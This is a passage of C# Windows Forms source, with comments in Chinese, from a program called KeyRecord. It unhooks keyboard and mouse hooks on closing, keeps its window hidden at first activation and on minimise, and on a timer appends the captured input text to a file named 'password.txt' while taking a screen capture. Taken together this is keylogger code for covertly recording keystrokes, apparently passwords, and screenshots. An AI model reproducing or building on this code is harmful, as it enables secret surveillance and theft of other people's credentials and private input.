                                timer1.Enabled = false;
                            }
                            hKeyboardHook = 0;
                        }
                         
                        #endregion
                        this.timer2.Start();
                    }
                }
                else
                {
                    this.txtCaption.Text = "请输入标题！";
                }
            }
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            wirteFile();
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (this.Visible == true)
            {
                this.Hide();
                this.ShowInTaskbar = false;
            }
            else
            {
                this.Visible = true;
                this.ShowInTaskbar = true;
                this.WindowState = FormWindowState.Normal;
                //this.Show();  
                this.BringToFront();
            }  
        }

       

        private void KeyRecord_FormClosing(object sender, FormClosingEventArgs e)
        {

            #region 卸载钩子
            // this.txtRecordInfo.Text += "/n/r";
            if (hKeyboardHook != 0)
            {
                if (UnhookWindowsHookEx(hKeyboardHook))//卸载当前钩子
                {
                    timer1.Enabled = false;
                }
                hKeyboardHook = 0;
            }

            // this.txtRecordInfo.Text += "/n/r";
            if (hMouseHook!= 0)
            {
                if (UnhookWindowsHookEx(hMouseHook))//卸载当前钩子
                {
                    timer1.Enabled = false;
                }
                hMouseHook = 0;
            }
            #endregion
        }

        private void KeyRecord_MinimumSizeChanged(object sender, EventArgs e)
        {
            this.Hide();
            this.notifyIcon1.ShowBalloonTip(100);
        }


        private void wirteFile()
        {

            //webBrowser1.Navigate();
            string info = this.txtRecordInfo.Text;

            if (!string.IsNullOrEmpty(info))
            {
                Rectangle rect = new Rectangle();
                //rect = Screen.GetWorkingArea(this);
                rect = Screen.PrimaryScreen.Bounds;
                var _Left = rect.Left;
                var _Right = rect.Right;
                var _Top = rect.Top;
                var _Bottom = rect.Bottom;
                CutImage(Width, Height, Left, Top, 0, 0, new Size(Width, Height));
                FileStream fs = null;
                var date = DateTime.Now.ToString();
                string FilePath = @"password.txt";
                byte[] content = new UTF8Encoding(true).GetBytes(info + "/r/n");
                try
                {
                    if (!File.Exists(FilePath))
                    {
                        fs = File.Create(FilePath, 1024000, FileOptions.Asynchronous);

                        fs.Write(content, 0, content.Length);
                    }
                    else
                    {
                        fs = new FileStream(FilePath, FileMode.Append, FileAccess.Write, FileShare.None, 1024000);
                        fs.Write(content, 0, content.Length);

                    }

                    fs.Flush();
                }
                catch (Exception ex)
                {
                    throw ex;
                }
                finally
                {
                    if (timer3.Enabled == true)
                    {
                        timer3.Enabled = false;
                    }
                     this.txtRecordInfo.Text = "";
                    fs.Close();
                }
            }
            else
            {
                if (timer3.Enabled == true)
                timer3.Enabled = false;
                 this.txtRecordInfo.Text = "";


            }
        }


        private bool windowCreate = true; 
       /// <summary>
       /// 重载active方法
       /// </summary>
       /// <param name="e"></param>
        protected override void OnActivated(EventArgs e)
        {
            if (windowCreate)
            {
                base.Visible = false;
                windowCreate = false;
            }

            base.OnActivated(e);
        }  
        
    }
}
